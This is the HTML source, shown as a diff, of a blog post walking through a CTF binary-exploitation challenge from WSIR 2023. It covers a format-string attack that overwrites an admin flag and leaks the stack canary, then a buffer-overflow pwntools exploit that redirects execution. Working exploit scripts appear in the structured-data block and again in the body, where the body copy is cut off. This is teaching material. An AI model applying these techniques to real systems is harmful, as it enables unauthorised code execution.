@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PWN - Stack binary exploiting Writeup | D4rkNebula Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Walkthrough stack pwn challenge from WSIR 2023 (I designed it 😉)">
+<meta name="author" content="D4rkNebula">
+<link rel="canonical" href="https://me.dgidc.ir/b/posts/3/">
+<link crossorigin="anonymous" href="/b/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/b/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://me.dgidc.ir/b/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://me.dgidc.ir/b/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://me.dgidc.ir/b/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://me.dgidc.ir/b/apple-touch-icon.png">
+<link rel="mask-icon" href="https://me.dgidc.ir/b/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="PWN - Stack binary exploiting Writeup" />
+<meta property="og:description" content="Walkthrough stack pwn challenge from WSIR 2023 (I designed it 😉)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://me.dgidc.ir/b/posts/3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-26T10:50:52-04:00" />
+<meta property="article:modified_time" content="2023-06-26T10:50:52-04:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PWN - Stack binary exploiting Writeup"/>
+<meta name="twitter:description" content="Walkthrough stack pwn challenge from WSIR 2023 (I designed it 😉)"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://me.dgidc.ir/b/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PWN - Stack binary exploiting Writeup",
+      "item": "https://me.dgidc.ir/b/posts/3/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN - Stack binary exploiting Writeup",
+  "name": "PWN - Stack binary exploiting Writeup",
+  "description": "Walkthrough stack pwn challenge from WSIR 2023 (I designed it 😉)",
+  "keywords": [
+    
+  ],
+  "articleBody": "About a month ago the WSIR 2023 national level was held and I was one of the competition designers and judges.\nNow, the blog wouldn’t be good enough without at least one post about binary exploiting so here it is.\nThis challenge is easy-medium and as I write this post I’ll solve it at the same time. I’ll try to explain my thought process as I go along, treating it as a black box (without having read the actual source code) (It’s been a while so it’ll be ok I guess).\nAnalysing the binary Well as anything else first we should analyse to see what we are dealing with, let’s see.\n$ file stack stack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=02dabf21c7908bf871d7a7144df54471ff8d3fb1, for GNU/Linux 3.2.0, not stripped Well the first good news is that the binary is dynamically linked. How about it’s mitigations?\n$ checksec --file=stack Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) (I’ll write a post about what are these and other basics of binary exploiting later and put the link here so this would be useful for everyone 😄 )\nwell at least the PIE is not enable which mean that the virtual address of codes and objects will be static and will not change each time we run the program. Further I’ll explain why is it useful.\nEnter your name: a Welcome user: a 1. Admin panel 2. Change your name 3. Reason you (the user) are here What do you want to do? Running the program to analyse what it’s supposed to do, we’ll see that it basically just get our name and print it and other options are either disable or we don’t have access to them.\nThis leaves us with two options, first buffer overflow which is not possible at this point becuase the canary is enable (We know it from checksec command) so this leaves us with only one more thing to try.\nFormat String Owasp\nEnter your name: %p Welcome user: 0x1 1. Admin panel 2. Change your name 3. Reason you (the user) are here What do you want to do? I won’t explain the format string vulnerability here, as I plan to write detailed posts about it and other topics related to pwn. I will provide a link to those posts later.\nSo now we know the vulenrability that we have but what can we do with it? Well first of all we can get the value of canary so we can exploit bof if there is one in the program. We have arbitary read and write usually with format string and well there is alot we can do but first let’s see what do we need.\nAssembly is fun Ah s**t, here we go again. Jokes aside usually assembly isn’t that frustrating, It’s just a puzzle you need to solve using time and effort whether for reversing and cracking or exploiting or etc.\nI’ll use r2 (radare2) for this challenge. Let’s check the functions.\n[0x7f1e458679c0]\u003e afl 0x004010d0 1 34 entry0 0x00401110 4 33 -\u003e 31 sym.deregister_tm_clones 0x00401140 4 49 sym.register_tm_clones 0x00401180 3 33 -\u003e 32 sym.__do_global_dtors_aux 0x004011b0 1 6 entry.init0 0x00401204 11 155 sym.admin 0x0040147c 1 9 sym._fini 0x0040129f 4 44 sym.ac 0x004011b6 3 78 sym.itguy 0x00401030 1 6 sym.imp.puts 0x00401080 1 6 sym.imp.gets 0x00401040 1 6 sym.imp.__stack_chk_fail 0x004012cb 1 22 sym.func 0x00401100 1 1 sym._dl_relocate_static_pie 0x004012e1 10 250 main 0x004013db 5 160 sym.disablefunction 0x00401000 3 23 sym._init 0x00401050 1 6 sym.imp.printf 0x00401060 1 6 sym.imp.fgets 0x00401070 1 6 sym.imp.getchar 0x00401090 1 6 sym.imp.fopen 0x004010a0 1 6 sym.imp.perror 0x004010b0 1 6 sym.imp.__isoc99_scanf 0x004010c0 1 6 sym.imp.exit If you are experienced in reversing, you will immediately notice the five interesting functions. But if you are not familiar with it, don’t worry, you don’t need to read all the functions. Start with the main function and check the custom functions inside it, then keep going. Let’s take a look at the main function. Alright, here is the 4 functionalities of menu. let’s examine what’s inside the func and ac functions, which correspond to option number three and one, respectively. As we expected, the func function was empty, but the ac function is interesting. (Admin panel functionality) Why? becuase of the obj.isadmin variable, which is set to zero. This is why we can’t login to the admin section. We can exploit format string to change that valueand this is the reason that disabled pie is good for us, even though it’s not impossible to obtain the Vaddr of the object with enabled PIE. It’s just easier without it, and in this case, we got lucky.\nExploiting Let’s get into admin panel. First we need to find the object virtual address which can be accomplished in many different ways. Since I’m already in the r2 so I’ll just run px @obj.isadmin and write the address.\n[0x7f1e458679c0]\u003e px @obj.isadmin - offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 0x0040406c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x0040407c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x0040408c 0000 0000 0000 0000 0000 0000 0000 0000 ................ Now I’m going to use pwntools library and write an exploit for this section to see what is going on in the admin panel.\nTry it out yourself first but here’s the code I wrote:\nBefore going further, let’s explain what is happening in the code.\nWell basically the code is getting the object addr automatically (I love automating), and generating and sending the payload for us to change that value but what’s that 8 and how did I get that?\nThe 8 is the offset for format string, basically the number that we can see our own input using format string. I found it as easy as just entring multiple %p %p and then checked which index was my input (I knew the hex code of my input) and the dictionary is to define change where to what.\nCanary 🐦 Canary is static all over the program so once we capture it we can use it in one or another function it’s not changing. Now how can we get that? Yeah using format string again we just need to find the offset and for that we’ll use r2 to see what is the canary by examining fs+0x28 (or something else if it’s different in the check) and get the value of that and then manually or automatically we check every offset to the value we got.\nfrom pwn import * e = context.binary = ELF(\"./stack\") isadmin = e.sym[\"isadmin\"] p = process() p.sendline(fmtstr_payload(8, {isadmin: 1})) p.interactive() # Attach r2 using pid and examine the 16bit value of fs+0x28 and get out of process interactive and put canary in the if below and we got the offset. for i in range(30): try: p.sendline('2') p.sendline(\"%\"+str(i)+\"$p\") p.recvuntil('Welcome user') p.recvline() a=p.recvline() if b'0xb1d00ccebad82000' in a: print(i) break except Exception as e: print(str(e)) Read the comment in the code…\nTHE BOF xD now we have the canary offset and able to get to the bof all that is left to do is to find the bof offset and write the exploit.\nfrom pwn import * e = context.binary = ELF(\"./stack\") isadmin = e.sym[\"isadmin\"] p = process() p.sendline(fmtstr_payload(8, {isadmin: 1})) p.recv() p.sendline(b'2\\n%17$p') p.recvuntil('Welcome user') p.recvline() canary=int(p.recvline(),16) payload = b'\\x00'*24 # Padding payload += p64(canary) # Canary value payload = payload.ljust(40, b'\\x00') # Padding again payload += p64(e.sym['disablefunction']) # Address of disabled function p.sendline(b'1\\n2\\n'+payload) # BOF print(p.recvall()) # Get the flag ",
+  "wordCount" : "1263",
+  "inLanguage": "en",
+  "datePublished": "2023-06-26T10:50:52-04:00",
+  "dateModified": "2023-06-26T10:50:52-04:00",
+  "author":{
+    "@type": "Person",
+    "name": "D4rkNebula"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://me.dgidc.ir/b/posts/3/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "D4rkNebula Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://me.dgidc.ir/b/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://me.dgidc.ir/b/" accesskey="h" title="D4rkNebula Blog (Alt + H)">D4rkNebula Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      PWN - Stack binary exploiting Writeup
+    </h1>
+    <div class="post-description">
+      Walkthrough stack pwn challenge from WSIR 2023 (I designed it 😉)
+    </div>
+    <div class="post-meta"><span title='2023-06-26 10:50:52 -0400 EDT'>June 26, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;D4rkNebula
+
+</div>
+  </header> 
+  <div class="post-content"><p>About a month ago the WSIR 2023 national level was held and I was one of the competition designers and judges.</p>
+<p>Now, the blog wouldn&rsquo;t be good enough without at least one post about binary exploiting so here it is.</p>
+<p>This challenge is easy-medium and as I write this post I&rsquo;ll solve it at the same time. I&rsquo;ll try to explain my thought process as I go along, treating it as a black box (without having read the actual source code) (It&rsquo;s been a while so it&rsquo;ll be ok I guess).</p>
+<h2 id="analysing-the-binary">Analysing the binary<a hidden class="anchor" aria-hidden="true" href="#analysing-the-binary">#</a></h2>
+<p>Well as anything else first we should analyse to see what we are dealing with, let&rsquo;s see.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file stack                                                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>stack: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>02dabf21c7908bf871d7a7144df54471ff8d3fb1, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></div><p>Well the first good news is that the binary is dynamically linked. How about it&rsquo;s mitigations?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec --file<span style="color:#f92672">=</span>stack
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>(I&rsquo;ll write a post about what are these and other basics of binary exploiting later and put the link here so this would be useful for everyone 😄 )</p>
+<p>well at least the PIE is not enable which mean that the virtual address of codes and objects will be static and will not change each time we run the program. Further I&rsquo;ll explain why is it useful.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Enter your name: 
+</span></span><span style="display:flex;"><span>a
+</span></span><span style="display:flex;"><span>Welcome user: 
+</span></span><span style="display:flex;"><span>a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1. Admin panel
+</span></span><span style="display:flex;"><span>2. Change your name
+</span></span><span style="display:flex;"><span>3. Reason you (the user) are here
+</span></span><span style="display:flex;"><span>What do you want to do? 
+</span></span></code></pre></div><p>Running the program to analyse what it&rsquo;s supposed to do, we&rsquo;ll see that it basically just get our name and print it and other options are either disable or we don&rsquo;t have access to them.</p>
+<p>This leaves us with two options, first buffer overflow which is not possible at this point becuase the canary is enable (We know it from checksec command) so this leaves us with only one more thing to try.</p>
+<h2 id="format-string">Format String<a hidden class="anchor" aria-hidden="true" href="#format-string">#</a></h2>
+<p><a href="https://owasp.org/www-community/attacks/Format_string_attack">Owasp</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Enter your name: 
+</span></span><span style="display:flex;"><span>%p
+</span></span><span style="display:flex;"><span>Welcome user: 
+</span></span><span style="display:flex;"><span>0x1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1. Admin panel
+</span></span><span style="display:flex;"><span>2. Change your name
+</span></span><span style="display:flex;"><span>3. Reason you (the user) are here
+</span></span><span style="display:flex;"><span>What do you want to do? 
+</span></span></code></pre></div><p>I won&rsquo;t explain the format string vulnerability here, as I plan to write detailed posts about it and other topics related to pwn. I will provide a link to those posts later.</p>
+<p>So now we know the vulenrability that we have but what can we do with it? Well first of all we can get the value of canary so we can exploit bof if there is one in the program. We have arbitary read and write usually with format string and well there is alot we can do but first let&rsquo;s see what do we need.</p>
+<h2 id="assembly-is-fun">Assembly is fun<a hidden class="anchor" aria-hidden="true" href="#assembly-is-fun">#</a></h2>
+<p>Ah s**t, here we go again.
+Jokes aside usually assembly isn&rsquo;t that frustrating, It&rsquo;s just a puzzle you need to solve using time and effort whether for reversing and cracking or exploiting or etc.</p>
+<p>I&rsquo;ll use r2 (radare2) for this challenge. Let&rsquo;s check the functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>0x7f1e458679c0<span style="color:#f92672">]</span>&gt; afl
+</span></span><span style="display:flex;"><span>0x004010d0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">34</span>           entry0
+</span></span><span style="display:flex;"><span>0x00401110    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">33</span>   -&gt; <span style="color:#ae81ff">31</span>   sym.deregister_tm_clones
+</span></span><span style="display:flex;"><span>0x00401140    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">49</span>           sym.register_tm_clones
+</span></span><span style="display:flex;"><span>0x00401180    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">33</span>   -&gt; <span style="color:#ae81ff">32</span>   sym.__do_global_dtors_aux
+</span></span><span style="display:flex;"><span>0x004011b0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            entry.init0
+</span></span><span style="display:flex;"><span>0x00401204   <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">155</span>          sym.admin
+</span></span><span style="display:flex;"><span>0x0040147c    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">9</span>            sym._fini
+</span></span><span style="display:flex;"><span>0x0040129f    <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">44</span>           sym.ac
+</span></span><span style="display:flex;"><span>0x004011b6    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">78</span>           sym.itguy
+</span></span><span style="display:flex;"><span>0x00401030    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.puts
+</span></span><span style="display:flex;"><span>0x00401080    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.gets
+</span></span><span style="display:flex;"><span>0x00401040    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.__stack_chk_fail
+</span></span><span style="display:flex;"><span>0x004012cb    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">22</span>           sym.func
+</span></span><span style="display:flex;"><span>0x00401100    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>            sym._dl_relocate_static_pie
+</span></span><span style="display:flex;"><span>0x004012e1   <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">250</span>          main
+</span></span><span style="display:flex;"><span>0x004013db    <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">160</span>          sym.disablefunction
+</span></span><span style="display:flex;"><span>0x00401000    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">23</span>           sym._init
+</span></span><span style="display:flex;"><span>0x00401050    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.printf
+</span></span><span style="display:flex;"><span>0x00401060    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.fgets
+</span></span><span style="display:flex;"><span>0x00401070    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.getchar
+</span></span><span style="display:flex;"><span>0x00401090    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.fopen
+</span></span><span style="display:flex;"><span>0x004010a0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.perror
+</span></span><span style="display:flex;"><span>0x004010b0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.__isoc99_scanf
+</span></span><span style="display:flex;"><span>0x004010c0    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span>            sym.imp.exit
+</span></span></code></pre></div><p>If you are experienced in reversing, you will immediately notice the five interesting functions. But if you are not familiar with it, don&rsquo;t worry, you don&rsquo;t need to read all the functions. Start with the main function and check the custom functions inside it, then keep going.
+Let&rsquo;s take a look at the main function.
+<img loading="lazy" src="/b/images/pwn-3-main.png" alt="Main function disassemble"  title="Main function disassemble"  />
+
+Alright, here is the 4 functionalities of menu. let&rsquo;s examine what&rsquo;s inside the func and ac functions, which correspond to option number three and one, respectively.
+<img loading="lazy" src="/b/images/pwn-3-two-func.png" alt="func and ac functions disassemble"  title="func and ac functions disassemble"  />
+
+As we expected, the func function was empty, but the ac function is interesting. (Admin panel functionality) Why? becuase of the obj.isadmin variable, which is set to zero. This is why we can&rsquo;t login to the admin section. We can exploit format string to change that valueand this is the reason that disabled pie is good for us, even though it&rsquo;s not impossible to obtain the Vaddr of the object with enabled PIE. It&rsquo;s just easier without it, and in this case, we got lucky.</p>
+<h2 id="exploiting">Exploiting<a hidden class="anchor" aria-hidden="true" href="#exploiting">#</a></h2>
+<p>Let&rsquo;s get into admin panel.
+First we need to find the object virtual address which can be accomplished in many different ways. Since I&rsquo;m already in the r2 so I&rsquo;ll just run <code>px @obj.isadmin</code> and write the address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>0x7f1e458679c0<span style="color:#f92672">]</span>&gt; px @obj.isadmin
+</span></span><span style="display:flex;"><span>- offset -   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">9</span>  A B  C D  E F  0123456789ABCDEF
+</span></span><span style="display:flex;"><span>0x0040406c  <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................                                                                                                                                                                       
+</span></span><span style="display:flex;"><span>0x0040407c  <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
+</span></span><span style="display:flex;"><span>0x0040408c  <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
+</span></span></code></pre></div><p>Now I&rsquo;m going to use pwntools library and write an exploit for this section to see what is going on in the admin panel.</p>
+<p>Try it out yourself first but here&rsquo;s the code I wrote:</p>
+<p><img loading="lazy" src="/b/images/pwn-3-admin.png" alt="Admin Panel Exploit"  title="Admin panel exploit"  />
+
+Before going further, let&rsquo;s explain what is happening in the code.</p>
+<p>Well basically the code is getting the object addr automatically (I love automating), and generating and sending the payload for us to change that value but what&rsquo;s that 8 and how did I get that?</p>
+<p>The 8 is the offset for format string, basically the number that we can see our own input using format string. I found it as easy as just entring multiple <code>%p %p</code> and then checked which index was my input (I knew the hex code of my input) and the dictionary is to define change <em>where</em> to <em>what</em>.</p>
+<h3 id="canary-">Canary 🐦<a hidden class="anchor" aria-hidden="true" href="#canary-">#</a></h3>
+<p>Canary is static all over the program so once we capture it we can use it in one or another function it&rsquo;s not changing. Now how can we get that? Yeah using format string again we just need to find the offset and for that we&rsquo;ll use r2 to see what is the canary by examining fs+0x28 (or something else if it&rsquo;s different in the check) and get the value of that and then manually or automatically we check every offset to the value we got.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./stack&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>isadmin <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;isadmin&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(fmtstr_payload(<span style="color:#ae81ff">8</span>, {isadmin: <span style="color:#ae81ff">1</span>}))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attach r2 using pid and examine the 16bit value of fs+0x28 and get out of process interactive and put canary in the if below and we got the offset.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;%&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;$p&#34;</span>)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Welcome user&#39;</span>)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>        a<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0xb1d00ccebad82000&#39;</span> <span style="color:#f92672">in</span> a:
+</span></span><span style="display:flex;"><span>            print(i)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(str(e))
+</span></span></code></pre></div><p>Read the comment in the code&hellip;</p>
+<h2 id="the-bof-xd">THE BOF xD<a hidden class="anchor" aria-hidden="true" href="#the-bof-xd">#</a></h2>
+<p>now we have the canary offset and able to get to the bof all that is left to do is to find the bof offset and write the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./stack&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>isadmin <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;isadmin&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(fmtstr_payload(<span style="color:#ae81ff">8</span>, {isadmin: <span style="color:#ae81ff">1</span>}))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%17$p&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Welcome user&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
